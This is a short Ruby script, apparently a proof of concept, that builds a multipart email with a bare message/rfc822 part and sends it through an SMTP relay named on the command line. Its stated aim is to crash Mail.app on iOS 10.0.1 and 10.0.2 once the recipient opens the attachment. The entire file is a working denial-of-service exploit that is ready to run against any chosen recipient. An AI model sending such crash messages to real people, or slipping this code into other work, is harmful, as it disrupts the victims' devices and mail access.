require 'net/smtp'
require 'mail'

# this will send a message that will crash Mail.app in iOS 10.0.2 and 10.0.1 when the attachment is opened

if ARGV.empty?
	puts "usage: #{$PROGRAM_NAME} smtp_relay sender recipient"
	exit
end

smtp_relay, sender, recipient = ARGV

crash_msg = Mail.new do
	from sender
	to recipient
	subject 'iOS 10 Mail.app multipart crash demo'
	body 'this is the message digest header'

	new_part = Mail::Part.new body:"here's a part"

	new_part.content_type="message/rfc822"
	add_part new_part
end

Net::SMTP.start smtp_relay, 25 do |smtp|
	smtp.send_message crash_msg.to_s, sender, recipient
end
